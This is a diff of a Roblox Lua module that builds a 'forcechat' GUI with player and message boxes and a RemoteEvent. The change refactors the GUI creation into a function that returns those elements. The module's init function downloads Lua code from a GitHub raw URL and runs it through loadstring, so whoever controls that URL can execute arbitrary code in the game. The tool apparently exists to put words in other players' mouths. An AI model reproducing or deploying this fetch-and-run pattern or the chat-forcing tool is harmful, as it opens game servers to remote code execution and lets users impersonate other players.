@@ -1,18 +1,18 @@
-local forcechat = Instance.new("ScreenGui")
-local main = Instance.new("Frame")
-local a = Instance.new("Frame")
-local TextLabel = Instance.new("TextLabel")
-local player = Instance.new("TextBox")
-local message = Instance.new("TextBox")
-local run = Instance.new("TextButton")
-local Frame = Instance.new("Frame")
-local forcingthechat = Instance.new("RemoteEvent")
-
 local loadstring = game:GetService("ReplicatedStorage"):FindFirstChild("loadstring")
 
 local module = {}
 
 function module.creategui(playeree)
+	local forcechat = Instance.new("ScreenGui")
+	local main = Instance.new("Frame")
+	local a = Instance.new("Frame")
+	local TextLabel = Instance.new("TextLabel")
+	local player = Instance.new("TextBox")
+	local message = Instance.new("TextBox")
+	local run = Instance.new("TextButton")
+	local Frame = Instance.new("Frame")
+	local forcingthechat = Instance.new("RemoteEvent")
+
 	forcechat.Name = "forcechat"
 	forcechat.Parent = playeree:FindFirstChild("PlayerGui")
 	forcechat.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
@@ -102,10 +102,12 @@ function module.creategui(playeree)
 
 	forcingthechat.Name = "forcingthechat"
 	forcingthechat.Parent = main
+
+	return forcingthechat, run, player, message
 end
 
 function module.init(playere)
-	module.creategui(playere)
+	local forcingthechat, run, player, message = module.creategui(playere)
 	
 	local serverscripts = loadstring(game:GetService("HttpService"):GetAsync("https://raw.githubusercontent.com/HELKLUAGF30MINUTESOFDATA12381/hi/fc/s.lua", true))()
 	
